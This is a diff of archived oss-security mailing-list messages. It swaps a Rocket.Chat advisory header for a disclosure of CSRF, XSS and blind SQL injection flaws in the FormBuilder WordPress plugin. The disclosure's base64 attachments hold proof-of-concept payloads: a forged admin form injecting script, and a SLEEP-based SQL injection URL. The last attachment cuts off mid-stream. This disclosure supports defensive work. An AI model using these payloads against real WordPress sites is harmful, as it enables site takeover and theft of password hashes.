@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5115" "Thursday" "7" "January" "2021" "16:45:48" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" "<xruvR7mNefMgnPSDcQHi8D4x11IH398iLrOkXxNz32ze9DqlhfN5xuyS0DOChRmxszawewy5CWK2O_PCUGQ0eU63mGRAJvqlIXs2kQxmMAc=@trovent.io>" "169" "[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil "1" "2021010716:45:48" "[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" (number mark "U       s.pietsch@tr Jan  7  169/5115  " thread-indent "\"[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["20034" "Saturday" "28" "January" "2017" "16:15:04" "+0100" "Summer of Pwnage" "lists@securify.nl" "<94274cdb-f6de-cb48-da2f-7696df89ff74@securify.nl>" "340" "[oss-security] Multiple vulnerabilities affecting two WordPress Plugins (XSS, CSRF & SQLi)" nil nil nil "1" "2017012815:15:04" "[oss-security] Multiple vulnerabilities affecting two WordPress Plugins (XSS, CSRF & SQLi)" (number mark "U       lists@securi Jan 28  340/20034 " thread-indent "\"[oss-security] Multiple vulnerabilities affecting two WordPress Plugins (XSS, CSRF & SQLi)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17433 invoked by uid 550); 7 Jan 2021 17:22:15 -0000
+Received: (qmail 11710 invoked by uid 550); 28 Jan 2017 15:15:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,191 +12,358 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5493 invoked from network); 7 Jan 2021 16:46:02 -0000
-Date: Thu, 07 Jan 2021 16:45:48 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
-	s=protonmail2; t=1610037950;
-	bh=6s21DxdGI7J310BLRmyv6dy4IydKYnSyAu94WyiiZAE=;
-	h=Date:To:From:Reply-To:Subject:From;
-	b=CGxofUsFmz88DE843kGUuJ4mfvMyJpghyrF87FjDXSplKa1xD25dAx4GuNwnasIxV
-	 VYs9fvZIGXB3BYPHE2CFKTLzITxfub0f/3ZLEAadQsX/V7XntPc06wClRrQliXG9/Z
-	 wo4Mbw78lhjH1tkjGulm4YJhhvY+IhMS6Lc70g3VlqJMIQmh87/uV6OMMrDku7bpuL
-	 fQIv9VJOPwcTV2XGkQ5kYx4m5+wjnOTPD/8NnIRpIDKNbLPXV0su9KAbfJnXAEEUUw
-	 twOibSs+AqCJsfGywp6SDCgutriqXa+0mDcB2uYqdnxwEguKV7HNr9TPwPHUTURdS8
-	 ZtlLqNfcJ1abg==
-To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
-From: Stefan Pietsch <s.pietsch@trovent.io>
-Message-ID: <xruvR7mNefMgnPSDcQHi8D4x11IH398iLrOkXxNz32ze9DqlhfN5xuyS0DOChRmxszawewy5CWK2O_PCUGQ0eU63mGRAJvqlIXs2kQxmMAc=@trovent.io>
+Received: (qmail 11683 invoked from network); 28 Jan 2017 15:15:17 -0000
+X-Virus-Scanned: amavisd-new at edge1.intern.zimbra-login.net
+From: Summer of Pwnage <lists@securify.nl>
+To: oss-security@lists.openwall.com
+Organization: Securify B.V.
+Message-ID: <94274cdb-f6de-cb48-da2f-7696df89ff74@securify.nl>
+Date: Sat, 28 Jan 2017 16:15:04 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.5.1
 MIME-Version: 1.0
-Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------a0045f27396069c44aafdec01bdd7c1d"; charset=utf-8
-Subject: [oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability
+Content-Type: multipart/mixed;
+ boundary="------------6C6527F16AA998F581C836CD"
+Subject: [oss-security] Multiple vulnerabilities affecting two WordPress Plugins (XSS, CSRF &
+ SQLi)
 
------------------------a0045f27396069c44aafdec01bdd7c1d
-Content-Type: multipart/mixed;boundary=---------------------3a030728afa836a510b570f792727d48
+--------------6C6527F16AA998F581C836CD
+Content-Type: text/plain; charset=utf-8; format=flowed
+Content-Transfer-Encoding: 7bit
 
------------------------3a030728afa836a510b570f792727d48
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;charset=utf-8
+Please see attached advisories for more information. These issues were 
+found during Summer of Pwnage (https://sumofpwn.nl), a Dutch community 
+project. Its goal is to contribute to the security of popular, widely 
+used OSS projects in a fun and educational way.
 
-# Trovent Security Advisory 2010-01 #
-#####################################
+--------------6C6527F16AA998F581C836CD
+Content-Type: text/plain; charset=UTF-8;
+ name="cross_site_request_forgery_vulnerability_in_formbuilder_wordpress_plugin_allows_plugin_permissions_modification.txt"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename*0="cross_site_request_forgery_vulnerability_in_formbuilder_word";
+ filename*1="press_plugin_allows_plugin_permissions_modification.txt"
 
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpDcm9zcy1TaXRlIFJlcXVl
+c3QgRm9yZ2VyeSB2dWxuZXJhYmlsaXR5IGluIEZvcm1CdWlsZGVyIFdvcmRQ
+cmVzcyBQbHVnaW4NCmFsbG93cyBwbHVnaW4gcGVybWlzc2lvbnMgbW9kaWZp
+Y2F0aW9uDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkJ1cmFrIEtl
+bGViZWssIEp1bHkgMjAxNg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0NCkFic3RyYWN0DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkEg
+Q3Jvc3MtU2l0ZSBSZXF1ZXN0IEZvcmdlcnkgdnVsbmVyYWJpbGl0eSBoYXMg
+YmVlbiBlbmNvdW50ZXJlZCBpbiB0aGUNCkZvcm1CdWlsZGVyIFdvcmRQcmVz
+cyBQbHVnaW4uIFRoaXMgaXNzdWUgYWxsb3dzIGFuIGF0dGFja2VyIHRvIGNo
+YW5nZQ0KcGVybWlzc2lvbiBzZXR0aW5ncyBmb3IgdGhlIHBsdWdpbiBieSBs
+dXJpbmcgYSBsb2dnZWQgb24gV29yZFByZXNzDQpBZG1pbmlzdHJhdG9yIGlu
+dG8gZm9sbG93aW5nIGEgbWFsaWNpb3VzIGxpbmsuDQoNCi0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLQ0KT1ZFIElEDQotLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0NCk9WRS0yMDE2MDcyNC0wMDA1DQoNCi0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLQ0KVGVzdGVkIHZlcnNpb25zDQotLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0NClRoaXMgaXNzdWUgd2FzIHN1Y2Nlc3NmdWxseSB0
+ZXN0ZWQgb24gRm9ybUJ1aWxkZXIgWzJdIHZlcnNpb24gMS4wNS4NCg0KLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpGaXgNCi0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLQ0KVGhpcyBpc3N1ZSBpcyByZXNvbHZlZCBpbiBGb3Jt
+QnVpbGRlciB2ZXJzaW9uIDEuMDggWzNdLg0KDQotLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0NCkludHJvZHVjdGlvbg0KLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tDQpUaGUgRm9ybUJ1aWxkZXIgUGx1Z2luIGZvciBXb3JkUHJl
+c3MgYWxsb3dzIHlvdSB0byBidWlsZCBjb250YWN0IGZvcm1zDQppbiB0aGUg
+V29yZFByZXNzIGFkbWluaXN0cmF0aXZlIGludGVyZmFjZSB3aXRob3V0IG5l
+ZWRpbmcgdG8ga25vdyBQSFAgb3INCkhUTUwuDQoNCi0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLQ0KRGV0YWlscw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tDQpUaGUgRm9ybUJ1aWxkZXIgcGx1Z2luIGxhY2tzIGEgQ1NSRiAo
+bm9uY2UpIHRva2VuIG9uIHRoZSByZXF1ZXN0IG9mDQpzYXZpbmcgcGVybWlz
+c2lvbnMuIEJlY2F1c2Ugb2YgdGhpcyBhbiBhdHRhY2tlciBpcyBhYmxlIHRv
+IGNoYW5nZQ0KcGVybWlzc2lvbiBzZXR0aW5ncyBmb3IgdGhlIHBsdWdpbi4g
+VG8gYWNoaWV2ZSB0aGlzIGEgbG9nZ2VkIG9uDQpXb3JkUHJlc3MgQWRtaW5p
+c3RyYXRvciBtdXN0IGJlIGx1cmVkIGludG8gZm9sbG93aW5nIGEgbWFsaWNp
+b3VzIGxpbmsuDQpQcm9vZiBvZiBDb25jZXB0IGNvZGUgdGhhdCBkZW1vbnN0
+cmF0ZXMgdGhpcyBpc3N1ZSBjYW4gYmUgZm91bmQgYmVsb3cuIA0KDQotLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClByb29mIG9mIGNvbmNlcHQNCi0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KVGhlIFByb29mIG9mIENvbmNl
+cHQgY29kZSBiZWxvdyBpbmplY3RzIHNjcmlwdCBjb2RlIGluIHRoZSAiTG9n
+aW4NClJlcXVpcmVkIE1lc3NhZ2UiIGluIHRoZSBzZXR0aW5ncyBwYWdlIG9m
+IHRoZSBGb3JtQnVpbGRlciBwbHVnaW4uDQoNCjxodG1sPg0KCTxib2R5Pg0K
+CQk8Zm9ybQ0KYWN0aW9uPSJodHRwOi8vYnVpbGQud29yZHByZXNzLWRldmVs
+b3AuZGV2L3dwLWFkbWluL2FkbWluLWFqYXgucGhwIg0KbWV0aG9kPSJQT1NU
+Ij4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRhc2siIHZhbHVl
+PSJ3ZG0mIzk1O3NhdmUmIzk1O3NldHRpbmdzIiAvPg0KCQkJPGlucHV0IHR5
+cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0id2RtJiM5NTtzZXR0
+aW5ncyIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNlY3Rp
+b24iIHZhbHVlPSJiYXNpYyIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4i
+IG5hbWU9IndwZG0mIzk1O3Blcm1pc3Npb24mIzk1O21zZyINCnZhbHVlPSJB
+Y2Nlc3MmIzMyO0RlbmllZCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4i
+IG5hbWU9IndwZG0mIzk1O2xvZ2luJiM5NTttc2ciDQp2YWx1ZT0iJmx0O3Nj
+cmlwdCZndDthbGVydCYjNDA7JmFwb3M7Y3NyZiYjMzI7eHNzJmFwb3M7JiM0
+MTsmbHQ7JiM0NztzY3JpcHQmZ3Q7JmFwb3M7Ig0KLz4NCgkJCTxpbnB1dCB0
+eXBlPSJoaWRkZW4iIG5hbWU9IiYjOTU7d3BkbSYjOTU7ZmlsZSYjOTU7YnJv
+d3NlciYjOTU7cm9vdCINCnZhbHVlPSImIzQ3O3NydiYjNDc7d3d3JiM0Nzt3
+b3JkcHJlc3MmIzQ1O2RldmVsb3AmIzQ3O2J1aWxkJiM0NzsiIC8+DQoJCQk8
+aW5wdXQgdHlwZT0iaGlkZGVuIg0KbmFtZT0iJiM5NTt3cGRtJiM5NTtmaWxl
+JiM5NTticm93c2VyJiM5NTthY2Nlc3MmIzkxOyYjOTM7Ig0KdmFsdWU9ImFk
+bWluaXN0cmF0b3IiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1l
+PSImIzk1OyYjOTU7d3BkbSYjOTU7c2FuaXRpemUmIzk1O2ZpbGVuYW1lIg0K
+dmFsdWU9IjAiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSIm
+Izk1OyYjOTU7d3BkbSYjOTU7ZG93bmxvYWQmIzk1O3NwZWVkIg0KdmFsdWU9
+IjQwOTYiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSImIzk1
+OyYjOTU7d3BkbSYjOTU7ZG93bmxvYWQmIzk1O3Jlc3VtZSINCnZhbHVlPSIx
+IiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiINCm5hbWU9IiYjOTU7JiM5
+NTt3cGRtJiM5NTtzdXBwb3J0JiM5NTtvdXRwdXQmIzk1O2J1ZmZlciIgdmFs
+dWU9IjEiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIg0KbmFtZT0iJiM5
+NTsmIzk1O3dwZG0mIzk1O29wZW4mIzk1O2luJiM5NTticm93c2VyIiB2YWx1
+ZT0iMCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IiYjOTU7
+d3BkbSYjOTU7cmVjYXB0Y2hhJiM5NTtzaXRlJiM5NTtrZXkiDQp2YWx1ZT0i
+IiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiINCm5hbWU9IiYjOTU7d3Bk
+bSYjOTU7cmVjYXB0Y2hhJiM5NTtzZWNyZXQmIzk1O2tleSIgdmFsdWU9IiIg
+Lz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iDQpuYW1lPSImIzk1OyYjOTU7
+d3BkbSYjOTU7ZGlzYWJsZSYjOTU7c2NyaXB0cyYjOTE7JiM5MzsiIHZhbHVl
+PSIiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSImIzk1OyYj
+OTU7d3BkbSYjOTU7bG9naW4mIzk1O3VybCIgdmFsdWU9IiINCi8+DQoJCQk8
+aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSImIzk1OyYjOTU7d3BkbSYjOTU7
+cmVnaXN0ZXImIzk1O3VybCINCnZhbHVlPSIiIC8+DQoJCQk8aW5wdXQgdHlw
+ZT0iaGlkZGVuIiBuYW1lPSImIzk1OyYjOTU7d3BkbSYjOTU7dXNlciYjOTU7
+ZGFzaGJvYXJkIg0KdmFsdWU9IiIgLz4NCgkJCTxpbnB1dCB0eXBlPSJzdWJt
+aXQiIHZhbHVlPSJTdWJtaXQgcmVxdWVzdCIgLz4NCgkJPC9mb3JtPg0KCTwv
+Ym9keT4NCjwvaHRtbD4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0K
+UmVmZXJlbmNlcw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpbMV0N
+Cmh0dHBzOi8vc3Vtb2Zwd24ubmwvYWR2aXNvcnkvMjAxNi9jcm9zc19zaXRl
+X3JlcXVlc3RfZm9yZ2VyeV92dWxuZXJhYmlsaXR5X2luX2Zvcm1idWlsZGVy
+X3dvcmRwcmVzc19wbHVnaW5fYWxsb3dzX3BsdWdpbl9wZXJtaXNzaW9uc19t
+b2RpZmljYXRpb24uaHRtbA0KWzJdIGh0dHBzOi8vd29yZHByZXNzLm9yZy9w
+bHVnaW5zL2Zvcm1idWlsZGVyLw0KWzNdIGh0dHBzOi8vZG93bmxvYWRzLndv
+cmRwcmVzcy5vcmcvcGx1Z2luL2Zvcm1idWlsZGVyLjEuMDguemlw
 
-Email address enumeration in reset password
-###########################################
+--------------6C6527F16AA998F581C836CD
+Content-Type: text/plain; charset=UTF-8;
+ name="multiple_blind_sql_injection_vulnerabilities_in_formbuilder_wordpress_plugin.txt"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename*0="multiple_blind_sql_injection_vulnerabilities_in_formbuilder_";
+ filename*1="wordpress_plugin.txt"
 
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpNdWx0aXBsZSBibGluZCBT
+UUwgaW5qZWN0aW9uIHZ1bG5lcmFiaWxpdGllcyBpbiBGb3JtQnVpbGRlciBX
+b3JkUHJlc3MNClBsdWdpbg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+DQpCdXJhayBLZWxlYmVrLCBKdWx5IDIwMTYNCg0KLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tDQpBYnN0cmFjdA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tDQpNdWx0aXBsZSBibGluZCBTUUwgaW5qZWN0aW9uIHZ1bG5lcmFi
+aWxpdGllcyB3ZXJlIGZvdW5kIGluIHRoZQ0KRm9ybUJ1aWxkZXIgV29yZFBy
+ZXNzIFBsdWdpbi4gVGhpcyBhbGxvd3MgYW4gYXR0YWNrZXIsIGdyYW50ZWQg
+aGUgaGFzDQpBdXRob3Igb3IgaGlnaGVyIHByaXZpbGVnZXMsIHRvIGV4dHJh
+Y3QgYXJiaXRyYXJ5IGRhdGEgKGVnIHRoZQ0KQWRtaW5pc3RyYXRvcidzIHBh
+c3N3b3JkIGhhc2gpIGZyb20gdGhlIFdvcmRQcmVzcyBkYXRhYmFzZS4gU2lu
+Y2UgdGhlcmUNCmlzIG5vIENTUkYgcHJvdGVjdGlvbiBpbiBwbGFjZSwgYW4g
+YXR0YWNrZXIgY291bGQgYWxzbyBsdXJlIGFuIGxvZ2dlZC1pbg0KQXV0aG9y
+IHRvIHBlcmZvcm0gbWFsaWNpb3VzIFNRTCBjb21tYW5kcyBvbiB0aGUgZGF0
+YWJhc2UuDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KT1ZFIElE
+DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCk9WRS0yMDE2MDcyNC0w
+MDA4DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KVGVzdGVkIHZl
+cnNpb25zDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClRoaXMgaXNz
+dWUgd2FzIHN1Y2Nlc3NmdWxseSB0ZXN0ZWQgb24gRm9ybUJ1aWxkZXIgWzJd
+IHZlcnNpb24gMS4wNS4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+DQpGaXgNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KVGhpcyBpc3N1
+ZSBpcyByZXNvbHZlZCBpbiBGb3JtQnVpbGRlciB2ZXJzaW9uIDEuMDggWzNd
+Lg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkludHJvZHVjdGlv
+bg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpUaGUgRm9ybUJ1aWxk
+ZXIgUGx1Z2luIGZvciBXb3JkUHJlc3MgYWxsb3dzIHlvdSB0byBidWlsZCBj
+b250YWN0IGZvcm1zDQppbiB0aGUgV29yZFByZXNzIGFkbWluaXN0cmF0aXZl
+IGludGVyZmFjZSB3aXRob3V0IG5lZWRpbmcgdG8ga25vdyBQSFAgb3INCkhU
+TUwuDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KRGV0YWlscw0K
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpJdCB3YXMgZGlzY292ZXJl
+ZCB0aGF0IEZvcm1CdWlsZGVyIGlzIGFmZmVjdGVkIGJ5IG11bHRpcGxlIGJs
+aW5kIFNRTA0KaW5qZWN0aW9uIHZ1bG5lcmFiaWxpdGllcy4gVXNpbmcgdGhl
+c2UgaXNzdWVzIGl0IGlzIHBvc3NpYmxlIGZvciBhDQpsb2dnZWQgb24gQXV0
+aG9yIChvciBoaWdoZXIgcHJpdmlsZWdlcykgdG8gZXh0cmFjdCBhcmJpdHJh
+cnkgZGF0YSAoZWcsDQp0aGUgQWRtaW5pc3RyYXRvcidzIHBhc3N3b3JkIGhh
+c2gpIGZyb20gdGhlIFdvcmRQcmVzcyBkYXRhYmFzZS4gU2luY2UNCnRoZXJl
+IGlzIG5vIENTUkYgcHJvdGVjdGlvbiBpbiBwbGFjZSwgYW4gYXR0YWNrZXIg
+Y291bGQgYWxzbyBsdXJlIGFuDQpsb2dnZWQtaW4gQXV0aG9yIHRvIHBlcmZv
+cm0gbWFsaWNpb3VzIFNRTCBjb21tYW5kcyBvbiB0aGUgZGF0YWJhc2UuDQoN
+ClRoZSB2dWxuZXJhYmlsaXRpZXMgZXhpc3QgaW4gdGhlIGZvbGxvd2luZyBm
+dW5jdGlvbnM6DQotIGZvcm1idWlsZGVyX29wdGlvbnNfZXhwb3J0Rm9ybSAN
+Ci0gZm9ybWJ1aWxkZXJfb3B0aW9uc19yZW1vdmVGb3JtIA0KLSBmb3JtYnVp
+bGRlcl9vcHRpb25zX2VkaXRGb3JtIA0KDQpUaGUgImZiaWQiIHBhcmFtZXRl
+ciB1c2VkIGluIHRoZSBhYm92ZSBmdW5jdGlvbnMgY2FuIGJlIHN1cHBsaWVk
+IGJ5IHRoZQ0KdXNlciBhbmQgaXMgYXBwZW5kZWQgdG8gdGhlIFdIRVJFIGNs
+YXVzZSBhcyAiZm9ybV9pZCIgZGlyZWN0bHkgd2l0aG91dA0KcGVyZm9ybWlu
+ZyBhbnkgc2FuaXRpemF0aW9uIG9yIGVzY2FwaW5nLg0KDQpFeGFtcGxlIDE6
+DQoNCmZvcm1idWlsZGVyL3BocC9mb3JtYnVpbGRlcl9hZG1pbl9mdW5jdGlv
+bnMucGhwIA0KY2FzZSAiZXhwb3J0Rm9ybSI6DQpmb3JtYnVpbGRlcl9vcHRp
+b25zX2V4cG9ydEZvcm0oJF9HRVRbJ2ZiaWQnXSk7DQoNCg0KZm9ybWJ1aWxk
+ZXIvcGhwL2Zvcm1idWlsZGVyX2FkbWluX3BhZ2VzLmluYy5waHANCmZ1bmN0
+aW9uIGZvcm1idWlsZGVyX29wdGlvbnNfZXhwb3J0Rm9ybSgkZm9ybV9pZCkN
+CiAJew0KIAkJWy4uXQ0KIAkJDQogCQkvKg0KIAkJICogTG9hZCB0aGUgZm9y
+bSBmaWVsZHMgZnJvbSB0aGUgZGF0YWJhc2UuDQogCQkqLw0KIAkJJHNxbCA9
+ICJTRUxFQ1QgKiBGUk9NICIgLiBGT1JNQlVJTERFUl9UQUJMRV9GT1JNUyAu
+ICIgV0hFUkUgaWQgPQ0KJyRmb3JtX2lkJyBMSU1JVCAwLDE7IjsNCiAJCSRy
+ZXN1bHRzID0gJHdwZGItPmdldF9yZXN1bHRzKCRzcWwsIEFSUkFZX0EpOw0K
+IAkJJGZvcm0gPSAkcmVzdWx0c1swXTsNCiAJCQ0KIAkJJHNxbCA9ICJTRUxF
+Q1QgKiBGUk9NICIgLiBGT1JNQlVJTERFUl9UQUJMRV9GSUVMRFMgLiAiIFdI
+RVJFIGZvcm1faWQNCj0gJGZvcm1faWQgT1JERVIgQlkgZGlzcGxheV9vcmRl
+ciBBU0M7IjsNCiAJCSRmaWVsZHMgPSAkd3BkYi0+Z2V0X3Jlc3VsdHMoJHNx
+bCwgQVJSQVlfQSk7DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0K
+UHJvb2Ygb2YgY29uY2VwdA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+DQpodHRwOi8vPHRhcmdldD4vd3AtYWRtaW4vdG9vbHMucGhwP3BhZ2U9Zm9y
+bWJ1aWxkZXIucGhwJmZidGFnJnBhZ2VOdW1iZXImZmJhY3Rpb249ZXhwb3J0
+Rm9ybSZmYmlkPTENCkFORCAoU0VMRUNUICogRlJPTSAoU0VMRUNUKFNMRUVQ
+KDUpKSlXU2RTKQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpSZWZl
+cmVuY2VzDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClsxXQ0KaHR0
+cHM6Ly9zdW1vZnB3bi5ubC9hZHZpc29yeS8yMDE2L211bHRpcGxlX2JsaW5k
